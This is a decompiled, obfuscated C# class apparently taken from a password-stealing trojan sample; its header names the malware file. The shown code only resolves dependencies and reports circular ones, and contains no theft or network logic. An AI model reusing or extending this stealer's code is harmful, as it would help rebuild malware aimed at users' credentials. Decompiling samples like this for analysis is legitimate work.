// Decompiled with JetBrains decompiler
// Type: wG.SG1
// Assembly: Type, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 716CE3A9-BAD1-470D-912F-B421D403F66E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-PSW.MSIL.Stealer.gen-ee62dc596e4b4fe76f8e015ac250d696a483f656ebb02d02815520b3fd560e30.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace wG
{
  public class SG1
  {
    private HashSet<TGp> N93;
    private List<OZ> n90;
    private Stack<TGp> k9M;
    private static SG1 NHM;

    [SpecialName]
    public HashSet<TGp> v9X() => this.N93;

    public List<OZ> T9S()
    {
      this.n90 = new List<OZ>();
      foreach (TGp tgp in this.N93)
        this.b9v(tgp);
      return this.n90;
    }

    private void b9v(TGp _param1)
    {
      if (!this.k9M.Contains(_param1))
        goto label_21;
      else
        goto label_6;
label_1:
      int num1;
      int num2 = num1;
label_2:
      bool flag;
      while (true)
      {
        switch (num2)
        {
          case 1:
            goto label_21;
          case 2:
            goto label_7;
          case 3:
            if (flag)
            {
              _param1.PRB(true);
              this.k9M.Push(_param1);
              foreach (TGp tgp in _param1.C9t())
                this.b9v(tgp);
              this.k9M.Pop();
              if (this.N93.Contains(_param1))
              {
                if (SG1.YHK())
                {
                  num2 = 0;
                  continue;
                }
                goto label_1;
              }
              else
                goto label_4;
            }
            else
              goto label_20;
          default:
            goto label_18;
        }
      }
label_4:
      return;
label_18:
      this.n90.Add(_param1.A9o());
      goto label_4;
label_20:
      return;
label_6:
      List<TGp> tgpList = new List<TGp>((IEnumerable<TGp>) this.k9M);
      tgpList.Reverse();
      StringBuilder stringBuilder = new StringBuilder("A circular depencence was detected: ");
      foreach (TGp tgp in tgpList)
        stringBuilder.Append(tgp.A9o().T1V() + " -> ");
label_7:
      stringBuilder.Append(((OZ) SG1.YHd((object) _param1)).T1V());
      RG2.u91(_param1.A9o().f19(), stringBuilder.ToString());
      if (SG1.YHK())
      {
        num2 = 1;
        goto label_2;
      }
      else
        goto label_1;
label_21:
      flag = !_param1.l9z();
      num2 = 3;
      if (SG1.uHX() == null)
        goto label_2;
      else
        goto label_1;
    }

    public SG1()
    {
      XTG.fvQjdC();
      this.N93 = new HashSet<TGp>();
      this.k9M = new Stack<TGp>();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static object YHd([In] object obj0) => (object) ((TGp) obj0).A9o();

    internal static bool YHK() => SG1.NHM == null;

    internal static SG1 uHX() => SG1.NHM;
  }
}
